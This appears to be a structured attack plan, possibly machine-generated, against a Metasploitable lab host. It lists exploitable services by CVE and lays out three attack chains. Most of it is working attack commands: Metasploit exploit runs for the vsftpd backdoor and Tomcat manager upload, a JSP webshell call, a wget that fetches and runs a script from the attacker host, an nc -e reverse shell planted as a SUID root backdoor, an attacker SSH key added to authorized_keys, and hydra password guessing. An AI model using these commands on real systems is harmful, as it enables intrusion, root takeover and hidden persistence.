summary: - vsftpd 2.3.4 backdoor (port 21, CVE-2011-2523, high-risk exploit available)
- Samba usermap_script vulnerability (ports 139/445, CVE-2007-2447, high-risk exploit, shares/users enumerated)
- Distcc exec vulnerability (port 1524, CVE-2004-2687, high-risk exploit for root shell)
- Apache mod_cgi bash env exec (port 80, CVE-2014-6271, high-risk exploit, web paths like phpMyAdmin exposed)
- Tomcat manager upload (port 8180, CVE-2009-0580, high-risk exploit)

attack_chains.name: Chain 1: FTP Backdoor to Root Shell to Cron Persistence
attack_chains.description: Exploit vsftpd backdoor for initial root access, leverage root for privilege escalation if needed, establish persistence via cron job.

stages.description: Use vsftpd 2.3.4 backdoor to gain root shell.
commands: msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.56.5; set RPORT 21; run'
verification: Check for root shell prompt (e.g., 'whoami' returns 'root')

stages.description: Already root from exploit; verify and stabilize shell if unstable.
Add cron job for reverse shell on reboot.
verification: Reboot target with 'reboot' and monitor listener

attack_chains.name: Chain 2: Samba Exploit to Shell to SUID Persistence
attack_chains.description: Exploit Samba usermap_script for command execution leading to shell, escalate if needed, persist via SUID binary.

stages.description: Exploit Samba CVE-2007-2447 for command execution and shell.
verification: Look for command execution success and shell in MSF session
smbclient -L //192.168.56.5 to confirm shares accessible post-exploit

stages.description: Exploit often gives root; if not, use common Metasploitable privesc like find / -perm -u=s -type f 2>/dev/null.
verification: 'sudo -l' shows available sudoers or 'id' confirms escalation to root
Exploit kernel vuln if needed: searchsploit linux kernel 2.6

stages.description: Create SUID binary for backdoor shell.
commands:
echo '#!/bin/bash
nc -e /bin/bash 192.168.56.1 4444' > /tmp/backdoor; chmod +x /tmp/backdoor; cp /tmp/backdoor /usr/local/bin/; chown root:root /usr/local/bin/backdoor; chmod 4755 /usr/local/bin/backdoor

attack_chains.name: Chain 3: Web Tomcat to Shell to SSH Key Persistence
attack_chains.description: Exploit Tomcat manager upload for JSP shell, escalate to root, add SSH key for persistence.

stages.description: Use Tomcat manager upload exploit on port 8180 for webshell.
commands: msfconsole -q -x 'use exploit/multi/http/tomcat_mgr_upload; set RHOSTS 192.168.56.5; set RPORT 8180; set USERNAME tomcat; set PASSWORD tomcat; run'
verification: MSF confirms upload and execution of JSP shell
curl http://192.168.56.5:8180/shell.jsp?cmd=id to verify remote cmd exec

stages.description: From web shell, upload privesc script or use known Metasploitable flaws.
commands: wget http://192.168.56.1/privesc.sh -O /tmp/privesc.sh; chmod +x /tmp/privesc.sh; /tmp/privesc.sh (upload via curl in shell)
verification: Check /etc/passwd for writable entries if needed

stages.description: Add attacker SSH public key to authorized_keys for msfadmin user.
commands: echo 'ssh-rsa AAAAB3NzaC1yc2E... attacker_key' >> /home/msfadmin/.ssh/authorized_keys; chmod 600 /home/msfadmin/.ssh/authorized_keys; chown msfadmin:msfadmin /home/msfadmin/.ssh/authorized_keys
verification: ssh msfadmin@192.168.56.5 with private key succeeds

followup_requests: Run detailed Nikto scan: nikto -h http://192.168.56.5 -p 80,8180
Enumerate Samba shares deeply: smbmap -H 192.168.56.5 -u guest or enum4linux -a 192.168.56.5
VNC password guess: hydra -L users.txt -P passwords.txt 192.168.56.5 vnc
Full NSE vuln scan: nmap -sV --script vuln -p- 192.168.56.5
